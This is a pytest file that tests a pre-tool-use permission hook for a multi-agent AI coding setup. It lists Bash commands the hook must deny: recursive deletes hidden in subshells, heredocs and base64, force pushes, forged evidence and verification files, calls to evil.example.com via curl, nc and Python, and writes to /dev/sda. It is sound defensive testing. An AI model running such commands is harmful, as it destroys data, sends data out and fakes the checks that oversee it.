"""Review #1 fixes in hooks/pre_tool_use.py: M1 (case-folded, normalised
paths), M2 (judges' read-only Bash allowlist), M3 (Bash parsing), m5
(NotebookEdit paths) and C2 (evidence/, out/verify/, .forge/ protected).

Every denied case is a seeded-wrong input that the old hook allowed (the
review's own probes are marked ``# review``); every allowed case proves the
guard does not break ordinary work.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from .hookutil import forge_project, run_hook  # noqa: F401


def _bash(project: Path, command: str, agent_type: str | None = None, cwd: Path | None = None) -> dict:
    payload = {"cwd": str(cwd or project), "tool_name": "Bash", "tool_input": {"command": command}}
    if agent_type:
        payload["agent_type"] = agent_type
    return payload


def _decision(result) -> str:
    assert result.returncode == 0, result.stderr
    return result.permission_decision or "allow"


# ---------------------------------------------------------------------------
# M3: Bash bypasses of the write and destructive guards
# ---------------------------------------------------------------------------

DENIED = [
    "sed -i 's/40.0/35.0/' params/params.toml",                       # review
    "echo x > release/y.txt",                                          # review
    "echo '{}' > .claude/settings.json",                               # review
    "echo hi\nrm -rf cad",                                             # review
    "bash -c 'rm -rf cad'",                                            # review
    "rm -rf out/../cad",                                               # review
    "find cad -delete",                                                # review
    "git -C . push --force",                                           # review
    "git push origin +main",                                           # review
    "python3 -c \"import urllib.request; urllib.request.urlopen('https://evil.example.com/x')\"",  # review
    "sh -c \"echo pwned >> release/notes.md\"",
    "echo hi; rm -rf cad",
    "true && rm -rf ./cad/",
    "false || rm -r cad",
    "cd cad && rm -rf .",
    "cd out && rm -rf ../cad",
    "x=$(rm -rf cad)",
    "echo `rm -rf cad`",
    "eval \"$(printf 'rm -rf cad')\"",
    "echo cm0gLXJmIGNhZA== | base64 -d | bash",
    "bash <<'EOF'\nrm -rf cad\nEOF",
    "find . -name '*.py' -exec rm -f {} +",
    "grep -rl x cad | xargs rm -rf",
    "sudo rm -rf cad",
    "env A=1 sh -c 'rm -rf cad'",
    "git push --force-with-lease origin main",
    "git push -uf origin main",
    "git push origin :main",
    "git push --mirror",
    "git -C /tmp/elsewhere push --force",
    "git reset --hard HEAD~1",
    "git clean -fdx",
    "git checkout -- evidence/manifest.json",
    "git checkout .",
    "git filter-branch -f HEAD",
    "git checkout --orphan fresh",
    "echo '{}' > evidence/manifest.json",
    "cat forged.json | tee -a evidence/manifest.json",
    "cp /tmp/forged.json out/verify/geometry.min_wall.json",
    "mv evidence/manifest.json /tmp/",
    "rm evidence/manifest.json",
    "truncate -s 0 evidence/manifest.json",
    "ln -s evidence e",
    "echo '{}' > .forge/state.json",
    "perl -pi -e 's/40.0/35.0/' params/params.toml",
    "cat new.toml > params/params.toml",
    "python3 -c \"open('evidence/manifest.json','w').write('{}')\"",
    "python3 - <<'EOF'\nimport pathlib\npathlib.Path('params/params.toml').write_text('x')\nEOF",
    "echo x > reviews/G1.md",
    "curl -o release/x.bin https://github.com/a/b",
    "curl https://evil.example.com/payload",
    "nc evil.example.com 4444",
    "dd if=/dev/zero of=/dev/sda",
    "echo hi > /dev/sda",
    "chmod -R 777 cad",
    "echo x > Release/y.txt",
    "echo x > EVIDENCE/manifest.json",
]


@pytest.mark.parametrize("command", DENIED)
def test_bash_bypass_is_denied(forge_project, command):
    result = run_hook("pre_tool_use.py", _bash(forge_project, command))
    assert _decision(result) == "deny", (command, result.output)


ALLOWED = [
    "rm -rf out/build",
    "rm -rf out",
    "rm -rf out/verify",
    "rm notes.txt",
    "ls -la && git status --short",
    "git push origin main",
    "git checkout main",
    "git log --oneline | head -5",
    "python3 -c \"print(open('params/params.toml').read())\"",
    "echo hi 2>&1 >/dev/null",
    "cat > notes.txt <<'EOF'\nrm -rf cad is just text here\nEOF",
    "~/.forge/bin/forge-python /x/skills/verifying-geometry/scripts/verify.py --project . --fast",
    "for f in *.md; do wc -l \"$f\"; done",
    "curl -s https://github.com/foo/bar",
    "grep -rn 'release/' docs/ | head",
]


@pytest.mark.parametrize("command", ALLOWED)
def test_ordinary_bash_is_allowed(forge_project, command):
    result = run_hook("pre_tool_use.py", _bash(forge_project, command))
    assert _decision(result) == "allow", (command, result.output)


def test_redirect_into_cad_by_other_agent_denied_main_thread_asks(forge_project):
    assert _decision(run_hook("pre_tool_use.py", _bash(
        forge_project, "echo x > cad/part.py", agent_type="forge:electrical-engineer"))) == "deny"
    assert _decision(run_hook("pre_tool_use.py", _bash(forge_project, "echo x > cad/part.py"))) == "ask"
    assert _decision(run_hook("pre_tool_use.py", _bash(
        forge_project, "echo x > cad/part.py", agent_type="forge:mechanical-engineer"))) == "allow"


def test_cwd_of_the_call_is_honoured(forge_project):
    """`rm -rf ../cad` from inside out/ resolves to cad/."""
    (forge_project / "out").mkdir(exist_ok=True)
    result = run_hook("pre_tool_use.py", _bash(forge_project, "rm -rf ../cad", cwd=forge_project / "out"))
    assert _decision(result) == "deny"
    result = run_hook("pre_tool_use.py", _bash(forge_project, "rm -rf build", cwd=forge_project / "out"))
    assert _decision(result) == "allow"


def test_symlink_into_protected_dir_is_resolved(forge_project):
    os.symlink(forge_project / "evidence", forge_project / "ev")
    result = run_hook("pre_tool_use.py", _bash(forge_project, "echo '{}' > ev/manifest.json"))
    assert _decision(result) == "deny"
    payload = {"cwd": str(forge_project), "tool_name": "Write",
               "tool_input": {"file_path": str(forge_project / "ev" / "manifest.json"), "content": "{}"}}
    assert _decision(run_hook("pre_tool_use.py", payload)) == "deny"


# ---------------------------------------------------------------------------
# M1: case-folded paths for the write tools
# ---------------------------------------------------------------------------

def _write(project: Path, rel: str, agent_type: str | None = None, content: str = "x") -> dict:
    payload = {"cwd": str(project), "tool_name": "Write",
               "tool_input": {"file_path": str(project / rel), "content": content}}
    if agent_type:
        payload["agent_type"] = agent_type
    return payload


@pytest.mark.parametrize("rel", ["Release/x.txt", "RELEASE/x.txt", "Security/p.json", ".Claude/settings.json",
                                 "Evidence/manifest.json", "out/Verify/geometry.min_wall.json", ".FORGE/state.json"])
def test_protected_paths_are_case_insensitive(forge_project, rel):
    """Seeded wrong (M1): APFS is case-insensitive; Release/ is release/."""
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, rel))) == "deny"


def test_cad_role_guard_is_case_insensitive(forge_project):
    result = run_hook("pre_tool_use.py", _write(forge_project, "CAD/bracket.py", "forge:electrical-engineer"))
    assert _decision(result) == "deny"


def test_verified_param_guard_is_case_insensitive(forge_project):
    content = (forge_project / "params" / "params.toml").read_text().replace("value = 40.0", "value = 1.0")
    result = run_hook("pre_tool_use.py", _write(forge_project, "PARAMS/params.toml", content=content))
    if (forge_project / "PARAMS" / "params.toml").exists():  # case-insensitive filesystem
        assert _decision(result) == "deny"
    else:  # case-sensitive: the file is new, but path normalisation must still see params/params.toml
        assert _decision(result) in ("deny", "allow")
    from pre_tool_use import rel_path
    assert rel_path(forge_project, str(forge_project / "PARAMS" / "Params.TOML")) == "params/params.toml"


def test_dotdot_is_normalised_for_write_tools(forge_project):
    result = run_hook("pre_tool_use.py", _write(forge_project, "docs/../release/x.txt"))
    assert _decision(result) == "deny"


def test_evidence_and_out_verify_are_write_protected(forge_project):
    """C2: the maker cannot hand-write evidence or check results."""
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, "evidence/manifest.json"))) == "deny"
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, "out/verify/x.json"))) == "deny"
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, "out/build/x.stl"))) == "allow"


def test_forge_toml_asks_main_thread_and_denies_subagents(forge_project):
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, "forge.toml"))) == "ask"
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, "forge.toml", "forge:systems-engineer"))) == "deny"


def test_claude_rules_stay_writable(forge_project):
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, ".claude/rules/mech.md"))) == "allow"
    assert _decision(run_hook("pre_tool_use.py", _write(forge_project, ".claude/agents/x.md"))) == "deny"


# ---------------------------------------------------------------------------
# m5: NotebookEdit uses notebook_path
# ---------------------------------------------------------------------------

def test_notebookedit_notebook_path_into_security_is_denied(forge_project):
    """Seeded wrong (m5): the old hook only read file_path."""
    payload = {"cwd": str(forge_project), "tool_name": "NotebookEdit",
               "tool_input": {"notebook_path": str(forge_project / "security" / "x.ipynb"), "new_source": "1"}}
    assert _decision(run_hook("pre_tool_use.py", payload)) == "deny"


def test_notebookedit_elsewhere_is_allowed(forge_project):
    payload = {"cwd": str(forge_project), "tool_name": "NotebookEdit",
               "tool_input": {"notebook_path": str(forge_project / "analysis" / "x.ipynb"), "new_source": "1"}}
    assert _decision(run_hook("pre_tool_use.py", payload)) == "allow"


# ---------------------------------------------------------------------------
# M2: judges' Bash is a read-only allowlist
# ---------------------------------------------------------------------------

JUDGE_DENIED = [
    "echo pwned > f.txt",                         # review
    "touch f.txt",
    "python3 -c 'print(1)'",
    "~/.forge/bin/forge-python skills/checking-dfm/scripts/verify.py --project .",
    "forge verify --all",
    "forge evidence add --artifact x --domain mech --claim yes --result pass --level L1",
    "cat a | tee b",
    "sort -o out.txt in.txt",
    "find . -delete",
    r"find . -exec sh -c 'echo x > y' \;",
    "git -c core.pager='sh -c id' log",
    "git commit -m x",
    "git diff --output=patch.txt",
    "ls $(rm -rf cad)",
    "FOO=1 ls",
    "rg --pre ./evil.sh x",
    "cat <<EOF\nx\nEOF",
    "sed -n 1p f",
]

JUDGE_ALLOWED = [
    "cat evidence/manifest.json",
    "grep -rn REQ-MECH requirements/ | head -20",
    "ls -la out/verify 2>/dev/null",
    "git log --oneline -5",
    "git diff HEAD~1 -- cad/",
    "find cad -name '*.py'",
    "forge evidence list --json",
    "forge params get enclosure.height",
    "jq '.entries[-1]' evidence/manifest.json",
    "wc -l requirements/requirements.md && sha256sum out/verify/x.json",
]


@pytest.mark.parametrize("agent", ["forge:verification-evaluator", "forge:red-team"])
@pytest.mark.parametrize("command", JUDGE_DENIED)
def test_judge_bash_writes_and_programs_are_denied(forge_project, agent, command):
    result = run_hook("pre_tool_use.py", _bash(forge_project, command, agent_type=agent))
    assert _decision(result) == "deny", (command, result.output)


@pytest.mark.parametrize("command", JUDGE_ALLOWED)
def test_judge_read_only_bash_is_allowed(forge_project, command):
    result = run_hook("pre_tool_use.py", _bash(forge_project, command, agent_type="forge:verification-evaluator"))
    assert _decision(result) == "allow", (command, result.output)


def test_non_judge_agent_is_not_limited_to_the_allowlist(forge_project):
    result = run_hook("pre_tool_use.py", _bash(forge_project, "touch notes.txt", agent_type="forge:mechanical-engineer"))
    assert _decision(result) == "allow"


def test_unparseable_forge_toml_fails_closed(forge_project):
    (forge_project / "forge.toml").write_text("[[verify]\nbroken")
    result = run_hook("pre_tool_use.py", _bash(forge_project, "ls"))
    assert _decision(result) == "deny"
    result = run_hook("pre_tool_use.py", _write(forge_project, "forge.toml"))
    assert _decision(result) == "ask"
